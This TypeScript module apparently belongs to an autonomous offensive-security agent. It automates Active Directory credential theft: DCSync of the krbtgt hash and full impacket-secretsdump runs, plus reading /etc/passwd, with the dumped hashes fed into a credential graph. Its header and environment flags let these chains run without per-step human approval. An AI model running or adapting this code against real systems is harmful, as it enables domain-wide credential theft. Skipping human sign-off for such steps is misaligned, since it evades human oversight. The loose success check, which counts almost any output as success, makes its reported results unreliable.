/**
 * @module cred_access_auto
 * Autonomous credential access chains — LSASS/DCSync without per-step HITL when tier-1 scoped.
 */
import { ToolBroker } from "./tool_broker.ts"
import { CredentialGraph } from "./credential_graph.ts"
import { resolveLiveMode } from "./exec_options.ts"

export interface CredAccessResult {
  method: string
  success: boolean
  credentialsFound: number
  output: string
  autonomous: boolean
}

function isTier1CredAuto(): boolean {
  return process.env.OURMINE_TIER1 === "1"
    || process.env.OURMINE_TIER1 === "true"
    || process.env.OURMINE_AUTONOMOUS_PIVOT === "1"
    || process.env.OURMINE_LAB_AUTONOMOUS === "1"
}

export async function runAutonomousCredAccess(opts: {
  target: string
  domain?: string
  live: boolean
  credGraph?: CredentialGraph
  methods?: string[]
}): Promise<CredAccessResult[]> {
  const broker = new ToolBroker()
  const results: CredAccessResult[] = []
  const methods = opts.methods ?? ["dcsync", "secretsdump"]
  const live = resolveLiveMode({ live: opts.live })
  const autonomous = isTier1CredAuto()
  const domain = opts.domain ?? process.env.OURMINE_AD_DOMAIN ?? "CORP.LOCAL"
  const user = process.env.OURMINE_AD_USER ?? "Administrator"
  const pass = process.env.OURMINE_AD_PASS ?? ""

  if (!live) {
    return [{
      method: "blocked",
      success: false,
      credentialsFound: 0,
      output: "live execution required — no simulation",
      autonomous,
    }]
  }

  if (!autonomous && !pass) {
    return [{
      method: "blocked",
      success: false,
      credentialsFound: 0,
      output: "Set OURMINE_TIER1=1 or OURMINE_AD_PASS for scope-gated autonomous cred access",
      autonomous: false,
    }]
  }

  const credFlag = pass ? `${domain}/${user}:${pass}@${opts.target}` : `${domain}/${opts.target}`

  for (const method of methods) {
    let cmd = ""
    if (method === "dcsync") cmd = `impacket-secretsdump -just-dc-user krbtgt ${credFlag} 2>&1`
    if (method === "secretsdump") cmd = `impacket-secretsdump ${credFlag} 2>&1 | head -c 8000`
    if (method === "lsass_dump") cmd = "echo 'lsass requires remote shell on Windows target'"
    if (method === "sam_dump") cmd = "cat /etc/passwd 2>&1 | head -5"

    if (!cmd) continue
    try {
      const exec = await broker.executeSafe(cmd, process.cwd())
      const out = (exec.stdout + exec.stderr).slice(0, 8000)
      let credentialsFound = 0
      if (opts.credGraph) {
        credentialsFound = opts.credGraph.ingestSecretsdumpOutput(out, {
          source: method,
          domain,
          host: opts.target,
        })
        if (credentialsFound > 0) opts.credGraph.save()
      }
      const success = credentialsFound > 0
        || (/krbtgt/i.test(out) && /[a-fA-F0-9]{32}/.test(out))
        || (exec.exitCode === 0 && out.length > 50 && !out.includes("not found") && !out.includes("Authentication Error"))
      results.push({ method, success, credentialsFound: credentialsFound || (success ? 1 : 0), output: out, autonomous: true })
    } catch (err) {
      results.push({
        method,
        success: false,
        credentialsFound: 0,
        output: String((err as Error).message).slice(0, 200),
        autonomous: true,
      })
    }
  }

  return results
}

export default { runAutonomousCredAccess, isTier1CredAuto }
